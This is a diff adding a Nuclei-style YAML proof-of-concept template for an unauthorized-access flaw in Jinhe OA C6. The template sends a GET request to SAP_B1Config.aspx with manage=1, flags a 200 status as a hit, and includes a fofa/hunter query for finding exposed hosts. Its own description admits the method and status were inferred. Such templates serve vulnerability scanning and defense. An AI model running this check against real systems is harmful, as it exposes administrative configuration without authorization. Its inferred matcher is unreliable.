@@ -1,0 +1,23 @@
+id: poc-995cddc9adb2bdcdca36
+info:
+  name: 金和OAC6SAP_B1Config存在未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/995cddc9adb2bdcdca369d818f12cf8e
+
+    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: unauth,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 995cddc9adb2bdcdca369d818f12cf8e
+    fofa: + hunter`app.name="金和 OA"`
+http:
+- raw:
+  - 'GET /C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1 HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
